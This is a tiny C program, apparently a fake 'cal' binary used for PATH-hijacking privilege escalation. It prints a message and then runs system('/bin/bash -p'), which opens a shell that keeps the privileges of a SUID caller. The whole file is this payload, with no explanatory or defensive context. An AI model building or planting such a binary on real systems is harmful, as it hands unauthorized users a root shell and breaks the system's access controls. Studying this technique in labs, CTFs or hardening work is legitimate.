#include <stdio.h>
#include <stdlib.h>

int main() {
  printf("Invoking self-defined cal\n");
  system("/bin/bash -p");
}
